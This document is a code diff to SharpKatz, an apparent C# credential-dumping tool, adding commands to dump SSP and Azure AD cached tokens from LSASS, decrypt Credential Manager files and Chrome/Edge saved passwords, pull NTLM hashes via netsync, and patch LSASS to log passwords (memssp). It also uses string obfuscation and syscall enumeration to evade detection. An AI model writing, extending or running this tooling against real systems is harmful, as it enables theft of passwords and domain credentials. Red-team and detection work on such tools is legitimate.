@@ -72,6 +72,14 @@ namespace SharpKatz
             string masterkey = null;
             string outputFile = null;
             string outputDir = null;
+            // dpapi::cred parameters
+            string credFile = null;
+            string credDir = null;
+            // dpapi::chrome parameters
+            string loginData = null;
+            string localState = null;
+            // netsync parameters
+            string account = null;
             bool showhelp = false;
 
             OptionSet opts = new OptionSet()
@@ -130,6 +138,14 @@ namespace SharpKatz
                 { "OutputFile=", "--OutputFile [output file path]", v => outputFile = v },
                 { "OutputDir=", "--OutputDir [output directory]", v => outputDir = v },
                 { "DC=", "--DC [domain controller]", v => dc = v },
+                // dpapi::cred parameters
+                { "CredFile=", "--CredFile [credential file path]", v => credFile = v },
+                { "CredDir=", "--CredDir [credentials directory]", v => credDir = v },
+                // dpapi::chrome parameters
+                { "LoginData=", "--LoginData [Chrome Login Data path]", v => loginData = v },
+                { "LocalState=", "--LocalState [Chrome Local State path]", v => localState = v },
+                // netsync parameters
+                { "Account=", "--Account [target account]", v => account = v },
 
                 { "h|?|help",  "Show available options", v => showhelp = v != null },
             };
@@ -196,6 +212,8 @@ namespace SharpKatz
                 Console.WriteLine("    credman              Credential Manager credentials");
                 Console.WriteLine("    wdigest              WDigest provider credentials");
                 Console.WriteLine("    ekeys                Kerberos encryption keys");
+                Console.WriteLine("    ssp                  SSP/LiveSSP provider credentials");
+                Console.WriteLine("    cloudap              Azure AD / Entra ID cached PRT");
                 Console.WriteLine("    sekurlsadpapi        Cached DPAPI masterkeys from LSASS");
                 Console.WriteLine();
                 Console.WriteLine("  lsadump:");
@@ -204,10 +222,13 @@ namespace SharpKatz
                 Console.WriteLine("    lsasecrets           Dump LSA secrets from SECURITY hive");
                 Console.WriteLine("    lsacache             Dump cached domain logons (DCC2)");
                 Console.WriteLine("    backupkeys           Extract DPAPI domain backup keys from DC");
+                Console.WriteLine("    netsync              Netlogon password sync (retrieve NTLM hashes)");
                 Console.WriteLine();
                 Console.WriteLine("  dpapi:");
                 Console.WriteLine("    dpapimasterkey       Decrypt DPAPI masterkey file");
                 Console.WriteLine("    dpapiblob            Decrypt DPAPI-protected blob");
+                Console.WriteLine("    dpapicred            Decrypt Credential Manager files");
+                Console.WriteLine("    chrome               Decrypt Chrome/Edge saved passwords");
                 Console.WriteLine();
                 Console.WriteLine("  crypto:");
                 Console.WriteLine("    certexport           Export certificates from local store");
@@ -222,6 +243,7 @@ namespace SharpKatz
                 Console.WriteLine("    token                Token manipulation");
                 Console.WriteLine("    vault                Windows Vault credentials");
                 Console.WriteLine("    spawn                Spawn process with PPID spoofing");
+                Console.WriteLine("    memssp               Patch LSASS to log credentials (memory-only)");
                 Console.WriteLine("    listshadows          Enumerate shadow copies");
                 Console.WriteLine();
                 Console.WriteLine("  Examples:");
@@ -230,6 +252,10 @@ namespace SharpKatz
                 Console.WriteLine("    SharpKatz.exe --Command pth --User admin --Domain corp --NtlmHash <hash>");
                 Console.WriteLine("    SharpKatz.exe --Command dumpsam --System <system_path> --Sam <sam_path>");
                 Console.WriteLine("    SharpKatz.exe --Command dpapimasterkey --MasterkeyFile <path> --Sid <SID> --Password <pass>");
+                Console.WriteLine("    SharpKatz.exe --Command dpapicred --CredFile <path> --Masterkey <hex> --MkGuid <GUID>");
+                Console.WriteLine("    SharpKatz.exe --Command chrome --LoginData <path> --LocalState <path> --MkFile <cache>");
+                Console.WriteLine("    SharpKatz.exe --Command netsync --DC dc01 --User DC01$ --NtlmHash <hash> --Account targetuser");
+                Console.WriteLine("    SharpKatz.exe --Command memssp");
                 Console.WriteLine("    SharpKatz.exe --Command token --Mode list");
                 Console.WriteLine("    SharpKatz.exe --Command spawn --Binary cmd.exe --ParentName svchost");
                 Console.WriteLine();
@@ -245,7 +271,9 @@ namespace SharpKatz
                 !command.Equals("lsasecrets") && !command.Equals("lsacache") && !command.Equals("certexport") &&
                 !command.Equals("token") && !command.Equals("vault") && !command.Equals("spawn") &&
                 !command.Equals("dpapimasterkey") && !command.Equals("dpapiblob") && !command.Equals("backupkeys") &&
-                !command.Equals("sekurlsadpapi"))
+                !command.Equals("sekurlsadpapi") && !command.Equals("ssp") && !command.Equals("cloudap") &&
+                !command.Equals("dpapicred") && !command.Equals("chrome") &&
+                !command.Equals("memssp") && !command.Equals("netsync"))
             {
                 Console.WriteLine("Unknown command");
                 return;
@@ -348,6 +376,28 @@ namespace SharpKatz
                 return;
             }
 
+            if (command.Equals("netsync"))
+            {
+                if (string.IsNullOrEmpty(dc))
+                {
+                    Console.WriteLine("   Missing required parameter -> DC or DomainController");
+                    return;
+                }
+                if (string.IsNullOrEmpty(user))
+                {
+                    Console.WriteLine("   Missing required parameter -> User (DC machine account, e.g. DC01$)");
+                    return;
+                }
+                if (string.IsNullOrEmpty(ntlmHash))
+                {
+                    Console.WriteLine("   Missing required parameter -> NtlmHash");
+                    return;
+                }
+                string targetAccount = account ?? user;
+                Module.NetSync.RunNetSync(dc, user, ntlmHash, targetAccount);
+                return;
+            }
+
             if (command.Equals("dpapimasterkey"))
             {
                 if (string.IsNullOrEmpty(masterkeyFile))
@@ -382,9 +432,50 @@ namespace SharpKatz
                 return;
             }
 
+            if (command.Equals("dpapicred"))
+            {
+                if (string.IsNullOrEmpty(credFile) && string.IsNullOrEmpty(credDir))
+                {
+                    Console.WriteLine("   Missing required parameter -> CredFile or CredDir");
+                    Console.WriteLine("   Use --CredFile <path> for a single credential file");
+                    Console.WriteLine("   Use --CredDir <path> to decrypt all files in a Credentials directory");
+                    return;
+                }
+
+                if (!string.IsNullOrEmpty(credDir))
+                {
+                    Module.DpapiCred.DecryptCredentialDir(credDir, masterkey, mkGuid, mkFile);
+                }
+                else
+                {
+                    Module.DpapiCred.DecryptCredentialFile(credFile, masterkey, mkGuid, mkFile);
+                }
+                return;
+            }
+
+            if (command.Equals("chrome"))
+            {
+                if (string.IsNullOrEmpty(loginData))
+                {
+                    Console.WriteLine("   Missing required parameter -> LoginData");
+                    Console.WriteLine("   Use --LoginData <path> to specify Chrome/Edge Login Data file");
+                    Console.WriteLine("   Use --LocalState <path> to specify Chrome/Edge Local State file");
+                    return;
+                }
+                if (string.IsNullOrEmpty(localState))
+                {
+                    Console.WriteLine("   Missing required parameter -> LocalState");
+                    Console.WriteLine("   Use --LocalState <path> to specify Chrome/Edge Local State file");
+                    return;
+                }
+
+                Module.DpapiChrome.DecryptChromePasswords(loginData, localState, masterkey, mkGuid, mkFile);
+                return;
+            }
+
             // --- Commands that need LSASS or elevated context ---
 
-            if (!command.Equals("dcsync") && !command.Equals("zerologon") && !command.Equals("printnightmare") && !command.Equals("hivenightmare") && !command.Equals("listshadows") && !command.Equals("dumpsam") && !command.Equals("lsasecrets") && !command.Equals("lsacache") && !command.Equals("certexport"))
+            if (!command.Equals("dcsync") && !command.Equals("zerologon") && !command.Equals("printnightmare") && !command.Equals("hivenightmare") && !command.Equals("listshadows") && !command.Equals("dumpsam") && !command.Equals("lsasecrets") && !command.Equals("lsacache") && !command.Equals("certexport") && !command.Equals("netsync"))
             {
 
                 if (!Utility.IsElevated())
@@ -402,6 +493,7 @@ namespace SharpKatz
                 IntPtr tspkg = IntPtr.Zero;
                 IntPtr lsasslive = IntPtr.Zero;
                 IntPtr dpapisrv = IntPtr.Zero;
+                IntPtr cloudap = IntPtr.Zero;
                 IntPtr hProcess = IntPtr.Zero;
 
                 // Find target process PID via syscall enumeration (avoid managed Process API hooks)
@@ -438,6 +530,7 @@ namespace SharpKatz
                 string sKerb = new string(new char[] { 'k','e','r','b','e','r','o','s','.','d','l','l' });
                 string sTspkg = new string(new char[] { 't','s','p','k','g','.','d','l','l' });
                 string sDpapisrv = new string(new char[] { 'd','p','a','p','i','s','r','v','.','d','l','l' });
+                string sCloudap = new string(new char[] { 'c','l','o','u','d','A','P','.','d','l','l' });
 
                 foreach (var kvp in loadedModules)
                 {
@@ -448,11 +541,21 @@ namespace SharpKatz
                     else if (lower.Equals(sKerb)) kerberos = kvp.Value;
                     else if (lower.Equals(sTspkg)) tspkg = kvp.Value;
                     else if (lower.Equals(sDpapisrv)) dpapisrv = kvp.Value;
+                    else if (lower.Equals(sCloudap)) cloudap = kvp.Value;
                 }
 
                 Keys keys = new Keys(hProcess, lsasrv, osHelper);
 
-                if (command.Equals("sekurlsadpapi"))
+                if (command.Equals("memssp"))
+                {
+                    if (lsassmsv1 == IntPtr.Zero)
+                    {
+                        Console.WriteLine("   [-] msv1_0.dll not found in LSASS modules");
+                        return;
+                    }
+                    Module.MemSsp.PatchSpAcceptCredentials(hProcess, lsassmsv1, osHelper.build);
+                }
+                else if (command.Equals("sekurlsadpapi"))
                 {
                     // sekurlsa::dpapi — dump cached DPAPI masterkeys from LSASS
                     if (dpapisrv == IntPtr.Zero)
@@ -499,6 +602,12 @@ namespace SharpKatz
 
                     if (command.Equals("logonpasswords") || command.Equals("wdigest"))
                         Module.WDigest.FindCredentials(hProcess, wdigest, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);
+
+                    if (command.Equals("logonpasswords") || command.Equals("ssp"))
+                        Module.Ssp.FindCredentials(hProcess, lsassmsv1, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);
+
+                    if (command.Equals("logonpasswords") || command.Equals("cloudap"))
+                        Module.CloudAp.FindCredentials(hProcess, cloudap, osHelper, keys.GetIV(), keys.GetAESKey(), keys.GetDESKey(), logonlist);
 
                     // sekurlsa::dpapi — dump cached DPAPI masterkeys (part of logonpasswords)
                     if (command.Equals("logonpasswords") && dpapisrv != IntPtr.Zero)
